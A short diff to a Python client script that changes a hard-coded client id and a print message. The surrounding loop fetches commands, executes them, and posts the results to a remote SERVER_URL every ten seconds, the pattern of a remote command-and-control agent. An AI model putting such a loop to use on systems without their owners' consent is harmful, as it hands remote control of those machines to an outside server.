@@ -32,7 +32,7 @@ def execute_command(cmd):
 def main():
     try:
         # client_id = log_client()
-        client_id = "12345"
+        client_id = "69420"
         while True:
             cmd = get_command()
             if cmd == "disconnect":
@@ -42,7 +42,7 @@ def main():
                 break
             result = execute_command(cmd)
             requests.post(SERVER_URL, json={"result": result}, params={'client': client_id, 'status': 'connected'}) # this goes hard
-            print("hi from client")
+            print("hello from client 3")
             time.sleep(10)
     except:
         print("*crickets*")
